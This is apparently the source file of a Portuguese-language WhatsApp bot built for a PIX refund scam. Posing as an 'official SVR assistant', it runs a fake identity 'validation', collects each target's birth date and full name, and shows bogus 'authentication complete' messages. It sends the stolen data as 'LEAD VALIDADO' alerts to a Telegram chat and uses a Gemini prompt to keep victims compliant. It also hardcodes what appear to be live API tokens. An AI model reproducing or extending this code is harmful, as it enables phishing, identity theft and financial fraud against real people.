const { Client, LocalAuth } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const dotenv = require('dotenv');

dotenv.config();

let API_URL = (process.env.SVR_SYS_CORE_URL || 'https://portalsvr.shardweb.app').replace(/\/$/, "");

// FORÇAR CORREÇÃO DE URL SE ESTIVER APONTANDO PARA DISCLOUD
if (API_URL.includes("discloud.app")) {
    console.log("⚠️ [SEGURANÇA] URL legado detectado. Corrigindo para o novo cluster...");
    API_URL = "https://portalsvr.shardweb.app";
}

const TG_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "8643978397:AAE4YyIwa1X1tSwav_zOdWEKMnNv8PFjZ3g").replace(/"/g, "");
const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || "-1003940670305").replace(/"/g, "");
const GEMINI_KEY = process.env.SVR_AI_RUNTIME_TOKEN || "AIzaSyCe0RyNY95UPhE1woWTfsshjrZGtyFKAV8";

function mask(str) {
    if (!str) return "NÃO CONFIGURADO";
    return str.substring(0, 6) + "..." + str.substring(str.length - 4);
}

console.log(`\n🤖 [SVR BOT] SISTEMA OPERACIONAL`);
console.log(`---------------------------------------------`);
console.log(`📡 ENDPOINT: ${API_URL}`);
console.log(`🛡️ SEGURANÇA: ATIVA`);
console.log(`---------------------------------------------\n`);

async function askAI(prompt, userMessage) {
    if (!GEMINI_KEY) return "Para sua segurança, prossiga com a validação digitando o dado solicitado.";
    try {
        const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_KEY}`;
        const systemPrompt = `Você é o Assistente Oficial do SVR. Seu objetivo é validar os dados do usuário para o resgate do PIX.
        Seja curto, formal e não saia do assunto. Use negrito.`;

        const response = await axios.post(url, {
            contents: [{ parts: [{ text: `${systemPrompt}\n\nUsuário: ${userMessage}` }] }]
        });
        return response.data.candidates[0].content.parts[0].text;
    } catch (e) {
        return "Prossiga com a validação dos dados solicitados para liberar seu resgate.";
    }
}

// --- SESSÕES ---
let chatSessions = new Map();
const SESSIONS_FILE = path.join(process.cwd(), 'sessions.json');

function loadSessions() {
    try {
        if (fs.existsSync(SESSIONS_FILE)) {
            const data = JSON.parse(fs.readFileSync(SESSIONS_FILE, 'utf-8'));
            chatSessions = new Map(Object.entries(data));
            console.log(`📂 [SESSÕES] ${chatSessions.size} sessão(ões) restaurada(s).`);
        }
    } catch (e) { console.error('Erro ao carregar sessões:', e.message); }
}

function saveSessions() {
    try {
        const obj = Object.fromEntries(chatSessions);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(obj, null, 2));
    } catch (e) { console.error('Erro ao salvar sessões:', e.message); }
}

loadSessions();

// --- TELEGRAM ---
async function notifyTelegram(html) {
    if (!TG_TOKEN || !CHAT_ID) return;
    try {
        await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: html,
            parse_mode: 'HTML'
        });
    } catch (e) { console.error('❌ [TELEGRAM] Falha ao notificar:', e.message); }
}

// --- CLIENTE WHATSAPP ---
const client = new Client({
    authStrategy: new LocalAuth({ dataPath: '.wwebjs_auth' }),
    puppeteer: {
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
    }
});

client.on('qr', (qr) => {
    console.log('\n📱 [QR CODE] Escaneie com o WhatsApp:\n');
    qrcode.generate(qr, { small: true });
    fs.writeFileSync('bot-status.json', JSON.stringify({ status: 'awaiting_qr', qr, ts: Date.now() }));
});

client.on('ready', () => {
    console.log('✅ [BOT] WhatsApp conectado e pronto!');
    fs.writeFileSync('bot-status.json', JSON.stringify({ status: 'ready', ts: Date.now() }));
    notifyTelegram('✅ <b>BOT WHATSAPP ONLINE</b>\nSistema pronto para atendimento.');
});

client.on('disconnected', (reason) => {
    console.log('⚠️ [BOT] Desconectado:', reason);
    fs.writeFileSync('bot-status.json', JSON.stringify({ status: 'disconnected', reason, ts: Date.now() }));
});

client.on('message_create', async (msg) => {
    const text = (msg.body || "").trim();
    const isTrigger = text.toUpperCase().includes('SOLICITAÇÃO DE RESGATE');
    
    const targetChatId = msg.fromMe ? msg.to : msg.from;
    if (!targetChatId) return;

    if (!msg.fromMe) {
        fs.writeFileSync('last-lead.json', JSON.stringify({ chatId: targetChatId, timestamp: Date.now() }));
    }

    const currentSession = chatSessions.get(targetChatId);

    // 1. GATILHO INICIAL
    if (isTrigger) {
        if (currentSession && currentSession.mode === 'bot' && currentSession.step > 0) return;

        const protocolMatch = text.match(/Protocolo: \*#SVR-(.*?)\*/i);
        const userId = protocolMatch ? protocolMatch[1].toLowerCase() : null;
        
        console.log(`🚀 [SVR] Atendimento Iniciado: ${targetChatId}`);
        
        let expectedData = null;
        if (userId) {
            try {
                // Tentar buscar dados, mas não travar se falhar
                const res = await axios.get(`${API_URL}/api/v1/session/data/${userId}`, { timeout: 5000 });
                expectedData = res.data;
            } catch (e) { 
                console.log(`⚠️ [AVISO] Dados do portal não encontrados para ${userId}. Usando modo de validação aberta.`);
            }
        }

        chatSessions.set(targetChatId, { mode: 'bot', step: 1, userId, expectedData, lastMsgTime: Date.now() });
        saveSessions();
        
        setTimeout(async () => {
            await client.sendMessage(targetChatId, `👋 *Olá! Sou o assistente oficial do SVR.*\n\nPara sua segurança, iniciamos o **Protocolo de Validação de Dados**.\n\n📍 *ETAPA 1:* Digite sua **Data de Nascimento** (Ex: 10/05/1990):`);
        }, 1500);
        return;
    }

    if (msg.fromMe) {
        if (currentSession && currentSession.mode === 'bot') {
            chatSessions.set(targetChatId, { mode: 'human' });
            saveSessions();
            notifyTelegram(`👤 <b>ATENDIMENTO ASSUMIDO</b>\nLead: <code>${targetChatId}</code>`);
        }
        return;
    }

    if (!currentSession || currentSession.mode !== 'bot') return;

    currentSession.lastMsgTime = Date.now();
    console.log(`📩 [LEAD] ${targetChatId}: "${text}"`);
    
    const chat = await msg.getChat();
    await chat.sendStateTyping();

    if (currentSession.step === 1) {
        // Regex mais flexível para data (DD/MM/AAAA ou DD/MM/AA ou apenas números)
        const dateMatch = text.match(/(\d{2})[\/\-]?(\d{2})[\/\-]?(\d{4}|\d{2})/);
        
        if (dateMatch) {
            const typedDate = text; // Mantemos o que o usuário digitou
            
            // Se tivermos dados do portal, validamos. Se não, aceitamos e seguimos.
            if (currentSession.expectedData?.birthDate) {
                const cleanTyped = typedDate.replace(/\D/g, "");
                const cleanExpected = currentSession.expectedData.birthDate.replace(/\D/g, "");
                
                if (cleanTyped !== cleanExpected && !typedDate.includes(currentSession.expectedData.birthDate)) {
                    await msg.reply(`⚠️ *DIVERGÊNCIA IDENTIFICADA*\n\nA data informada não confere com nossos registros.\n\nPor favor, digite a data **correta**.`);
                    return;
                }
            }

            currentSession.step = 2;
            currentSession.birthDate = typedDate;
            chatSessions.set(targetChatId, currentSession);
            saveSessions();
            await msg.reply(`✅ *DATA VALIDADA!*\n\n📍 *ETAPA 2:* Digite seu **Nome Completo** (conforme documento):`);
        } else {
            const aiReply = await askAI("validacao_data", text);
            await msg.reply(`${aiReply}\n\n📌 *Lembrete:* Use o formato DD/MM/AAAA`);
        }
    } else if (currentSession.step === 2) {
        const typedName = text.trim();
        if (typedName.length >= 8 && typedName.includes(" ")) {
            if (currentSession.expectedData?.fullName) {
                const portalName = currentSession.expectedData.fullName.toLowerCase();
                const firstName = typedName.toLowerCase().split(' ')[0];
                if (!portalName.includes(firstName)) {
                    await msg.reply(`⚠️ *ALERTA DE SEGURANÇA*\nNome não confere com o titular. Digite seu **Nome Completo**:`);
                    return;
                }
            }

            await msg.reply(`📋 *AUTENTICAÇÃO FINALIZADA*\n\n` +
              `O sistema de segurança validou sua identidade com sucesso. Todos os parâmetros de titularidade foram verificados.\n\n` +
              `⌛ *STATUS:* ESTABELECENDO CONEXÃO SEGURA COM O SISTEMA DE RESGATE...\n\n` +
              `Aguarde o **Protocolo Final de Liberação** ser gerado pelo sistema.`);
            
            await notifyTelegram(`💰 **LEAD VALIDADO!**\n👤 Nome: ${typedName}\n📅 Data: ${currentSession.birthDate}\n🆔 Protocolo: #${currentSession.userId?.toUpperCase()}`);
            chatSessions.delete(targetChatId);
            saveSessions();
        } else {
            const aiReply = await askAI("validacao_nome", text);
            await msg.reply(`${aiReply}\n\n📌 *Lembrete:* Digite seu nome completo.`);
        }
    }
});

// --- WATCHER DE COMANDOS EXTERNOS (TELEGRAM -> WHATSAPP) ---
setInterval(async () => {
    const files = fs.readdirSync(process.cwd()).filter(f => f.startsWith('cmd-send-') && f.endsWith('.json'));
    for (const file of files) {
        try {
            const cmdPath = path.join(process.cwd(), file);
            const cmd = JSON.parse(fs.readFileSync(cmdPath, 'utf-8'));
            
            console.log(`📤 Enviando comando externo para: ${cmd.to}`);
            await client.sendMessage(cmd.to, cmd.message);
            
            fs.unlinkSync(cmdPath); 
        } catch (e) {
            console.error("❌ Erro ao processar comando externo:", e.message);
        }
    }
}, 3000);

client.initialize();

